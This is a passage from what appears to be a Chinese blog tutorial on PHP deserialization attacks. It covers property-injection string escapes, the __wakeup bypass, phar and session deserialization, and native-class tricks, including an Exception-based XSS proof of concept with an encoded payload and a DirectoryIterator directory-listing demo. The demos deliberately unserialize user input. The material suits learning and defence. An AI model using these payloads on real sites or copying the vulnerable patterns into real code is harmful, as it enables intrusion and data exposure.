class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    <span class="keyword">var</span></span><br></pre></td></tr></table></figure><h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><ul><li>触发时机：当使用<code>clone</code>关键字拷贝完成一对象后，新对象会自动调用定义的魔术方法<code>_clone()</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>)</span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line">    __clone test</span><br></pre></td></tr></table></figure><h1 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>反序列化分隔符</li></ul><p>反序列化以<code>;&#125;</code>结束，后面的字符串不影响正常的反序列化</p><ul><li>属性逃逸</li></ul><p>一般在数据先经过一次<code>serialize</code>在经过<code>unserialize</code>，在这个中间反序列化的字符串变多或者变少的时候可能存在反序列化属性逃逸</p><h2 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()system()system()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arga</span>,<span class="variable">$argc</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$arga</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;v2 = <span class="variable">$argc</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;system()&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"></span><br><span class="line">输出结果</span><br><span class="line">    <span class="keyword">object</span>(A)<span class="comment">#1 (2) &#123; [&quot;v1&quot;]=&gt; NULL [&quot;v2&quot;]=&gt; NULL &#125;</span></span><br></pre></td></tr></table></figure><p>例：利用字符串逃逸，通过字符减少的方式，使结果增加一个变量<code>v3</code>，其值为<code>666</code></p><p>创建对象后的<code>$data</code>值：<code>O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abcsystem()system()system()&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</code></p><p>通过<code>str_replace</code>处理后的值：<code>O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 变量的值是由其前面的长度控制的，在处理后的值中，system()被替换为空，导致v1值的长度和前面对不上，在反序列化中就不会成功。</span></span><br><span class="line"><span class="comment"> 所以我们需要控制v2的数据内容，来创造一个v3的值为666，且要将v1的数据长度和内容相匹配。</span></span><br><span class="line"><span class="comment"> 在构造时要注意用;&#125;提前闭合，数据内容和长度要匹配。</span></span><br><span class="line"><span class="comment"> 理论成功，实践开始。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> 观察上述字符串发现v1值长度为27，但是其真正的内容只有abc，所以会继续吞掉后面的数据直到27位为止。</span></span><br><span class="line"><span class="comment"> 而我们要恶意构造的内容在v2中，不妨直接将v2的值与前面分离，便于观察</span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;    123&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> 因为我们要创建一个v3的值为666，通过改变v2的值来实现，所以将v2的值123替换为$v3=&quot;666&quot;的序列化内容,且要将序列化内容提前闭合</span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;    ;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> 发现v2改完之后的长度为21，因为v1数据长度为27，这个是无法改变的，通过上一步计算得到v2数据的长度是个两位数，发现到构造v2数据之前的v1的值长度为19，所以我们需要将其补全为27。</span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:xx:&quot;1234567&quot;    ;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> 将v2内容计算长度，补充完整</span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:29:&quot;1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> 此时v1，v2的值都确认下来了</span></span><br><span class="line"><span class="comment"> - v1 = abcsystem()system()system()</span></span><br><span class="line"><span class="comment"> - v2 = 1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//将上述的值传参进去，发现变量v3成功逃逸出来了</span></span><br><span class="line"><span class="keyword">object</span>(A)<span class="comment">#1 (3) &#123; [&quot;v1&quot;]=&gt; string(27) &quot;abc&quot;;s:2:&quot;v2&quot;;s:29:&quot;1234567&quot; [&quot;v2&quot;]=&gt; string(3) &quot;123&quot; [&quot;v3&quot;]=&gt; string(3) &quot;666&quot; &#125;</span></span><br></pre></td></tr></table></figure><h2 id="字符增加"><a href="#字符增加" class="headerlink" title="字符增加"></a>字符增加</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arga</span>,<span class="variable">$argc</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$arga</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v2 = <span class="variable">$argc</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"></span><br><span class="line">输出结果</span><br><span class="line">    <span class="keyword">object</span>(A)<span class="comment">#1 (2) &#123; [&quot;v1&quot;]=&gt; NULL [&quot;v2&quot;]=&gt; NULL &#125;</span></span><br></pre></td></tr></table></figure><p>例：利用字符串逃逸，通过字符增加的方式，使结果增加一个变量<code>v3</code>，其值为<code>666</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 观察代码发现每有一个ls，就会被替换pwd，从而使长度错误，不能执行反序列化。</span></span><br><span class="line"><span class="comment"> 我们可以将需要创造的变量写成序列化的值，将位数计算出来，通过多个ls将位数补齐，使其与替换后的长度相同。</span></span><br><span class="line"><span class="comment"> 因为此处需要操作的只有一个变量v1，所以不需要管v2的值</span></span><br><span class="line"><span class="comment"> 理论成功，实践开始。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;pwd&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment"> 观察上述代码发现，v1数据长度与实际长度不匹配，所以我们需要让它把我们需要的长度吐出来，从而构建我们所需要的代码。</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> 构建需要创建的变量值：因为不需要考虑v2的值，所以我们构造完成后就可以利用;&#125;结束反序列化，又因为，我们要将序列化内容单独拿出来使其逃逸，所以用&quot;;隔断</span></span><br><span class="line"><span class="comment"> - &quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> 计算发现上述内容长度为22，ls是两位，替换后变成pwd是三位，所以会吐出来一位，我们需要22位，所以需要22个ls加上上述序列化内容，其长度等于替换后的22个pwd的长度，于是，v3的值就逃逸出来</span></span><br><span class="line"><span class="comment"> - lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;</span></span><br><span class="line"><span class="comment"> - 替换前的:</span></span><br><span class="line"><span class="comment"> O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:66:&quot;lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment"> - 替换后的：</span></span><br><span class="line"><span class="comment"> O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:66:&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment"> 可以发现，v3的值成功逃逸出来了</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> - v1=lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;</span></span><br><span class="line"><span class="comment"> - v2=任意值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将上述的值传参进去，发现变量v3成功逃逸出来了</span></span><br><span class="line"><span class="keyword">object</span>(A)<span class="comment">#1 (3) &#123; [&quot;v1&quot;]=&gt; string(66) &quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot; [&quot;v2&quot;]=&gt; string(3) &quot;123&quot; [&quot;v3&quot;]=&gt; string(3) &quot;666&quot; &#125;</span></span><br></pre></td></tr></table></figure><h1 id="weakup魔术方法绕过"><a href="#weakup魔术方法绕过" class="headerlink" title="weakup魔术方法绕过"></a>weakup魔术方法绕过</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><blockquote><p>如果存在<code>__weakup</code>方法，调用<code>unserilize()</code>方法前则先调用<code>weakup</code>方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过<code>__weakup()</code>的执行</p></blockquote><h2 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h2><blockquote><p>PHP5&lt;5.6.25</p><p>PHP7&lt;7.0.10</p></blockquote><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><blockquote><p>当<code>session_start()</code>被调用或者<code>php.ini</code>中<code>session.auto_start</code>为<strong>1</strong>时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为<code>/tmp</code>）</p></blockquote><h2 id="存储格式"><a href="#存储格式" class="headerlink" title="存储格式"></a>存储格式</h2><div class="table-container"><table><thead><tr><th>处理器</th><th>对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名＋竖线+经过serialize()函数序列化处理的值</td></tr><tr><td>php_serialize(php&gt;=5.5.4)</td><td>经过serialize()函数序列化处理的数组</td></tr><tr><td>php_binary</td><td>键名的长度对应的ASCII字符+键名+经过unserialize()函数反序列化处理的值</td></tr></tbody></table></div><h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h2 id="什么是phar"><a href="#什么是phar" class="headerlink" title="什么是phar"></a>什么是phar</h2><blockquote><p>PHAR是PHP里类似于JAR的一种打包文件</p><p>对于PHP5.3或更高版本，PHAR后缀文件是默认开启支持的，可以直接使用它。</p><p>文件包含：phar伪协议，可读取<code>.phar</code>文件</p></blockquote><h2 id="phar结构"><a href="#phar结构" class="headerlink" title="phar结构"></a>phar结构</h2><blockquote><p><code>stub phar</code>文件标识，格式为<code>xxx&lt;?php xxx;__HALT_COMPiLER();?&gt;</code>（头部信息）</p><p><code>manifest</code>压缩文件的属性等信息，以序列化存储；</p><p><code>contents</code>压缩文件的内容；</p><p><code>signature</code>签名，放在文件末尾；</p><p>Phar协议解析文件时，会自动触发对<code>manifest</code>字段的序列化字符串进行反序列化</p></blockquote><h2 id="phar使用条件"><a href="#phar使用条件" class="headerlink" title="phar使用条件"></a>phar使用条件</h2><blockquote><p>phar文件能上传到服务器</p><p>要有可用序列化魔术方法作为跳板</p><p>要有文件操作函数，如<code>file_exists()</code>，<code>fopen()</code>，<code>file_get_contents()</code></p><p>文件操作函数参数可控，且<code>: / phar</code>等特殊字符没有被过滤</p></blockquote><h1 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a>php原生类</h1><p><strong>常见的原生类：</strong></p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>DirectoryIterator</li><li>SimpleXMLElement</li></ul><h2 id="Error-Exception-内置类进行-XSS"><a href="#Error-Exception-内置类进行-XSS" class="headerlink" title="Error/Exception 内置类进行 XSS"></a>Error/Exception 内置类进行 XSS</h2><p><code>__toString</code>方法会返回错误或异常的字符串形式，其中包含我们输入的参数，如果我们构造一串xss代码，结合echo渲染，将触发反射形xss漏洞</p><p><strong>demo</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;1&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A27%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert%<span class="number">28</span>%<span class="number">271</span>%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A52%<span class="number">3</span>A%<span class="number">22</span>D%<span class="number">3</span>A%<span class="number">5</span>C666%<span class="number">5</span>Capps%<span class="number">5</span>CPhpStorm%<span class="number">5</span>CProject%<span class="number">5</span>Cdemo%<span class="number">5</span>Cdemo_01%<span class="number">5</span>Cpoc_01.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>将结果作为参数传进去，成功弹窗！（exception适用于php5和7,error只适用于php7）</p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/demo_01.png" alt=""></p><p><strong>Exception</strong>是所有用户级异常的基类。 (PHP 5, 7, 8)</p><h2 id="Error-Exception-内置类绕过哈希比较"><a href="#Error-Exception-内置类绕过哈希比较" class="headerlink" title="Error/Exception 内置类绕过哈希比较"></a>Error/Exception 内置类绕过哈希比较</h2><p>通过构造这两个类可以啊绕过md5()和sha1()函数。error和exception都有一个重要方法：_tostring，用于将异常对象转换为字符串。</p><p>同样，当md5()和sha1()函数处理对象时，会自动调用__tostring方法</p><p><strong>demo</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a = new Exception(<span class="string">&quot;payload&quot;</span>,1);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">b = new Exception(<span class="string">&quot;payload&quot;</span>,2);</span></span><br><span class="line">echo $a.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $b.&quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/demo_02.png" alt=""></p><p><strong>test</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a = new Exception(<span class="string">&quot;payload&quot;</span>,1);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">b = new Exception(<span class="string">&quot;payload&quot;</span>,2);</span></span><br><span class="line">if ($a!==$b)&#123;</span><br><span class="line">    echo &quot;$a不等于$b&quot;.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (md5($a)===md5($b))&#123;</span><br><span class="line">    echo &quot;md5值相等&quot;.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (sha1($a)===sha1($b))&#123;</span><br><span class="line">    echo &quot;sha1值相等&quot;.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/test_02.png" alt=""></p><p>可以看出，payload后面的参数并不影响输出的结果。正是通过这个可以绕过哈希函数。</p><h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsd1</span> [, <span class="keyword">array</span> <span class="variable">$options</span> ])</span><br></pre></td></tr></table></figure><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h3><p>DirectoryIterator 类会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名：</p><p><strong>demo</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$b</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/demo_03.png" alt=""></p><p><strong>输出指定目录里面经过排序之后的第一个文件名</strong></p><p>使用此内置类的__toString方法结合glob或file协议，即可实现目录遍历</p><p>多一个斜杠，目录往前一个。</p><p>我们也可以配合<strong>glob://协议</strong>使用<strong>模式匹配</strong>来寻找我们想要的<strong>文件路径</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*php*&quot;</span>);</span><br><span 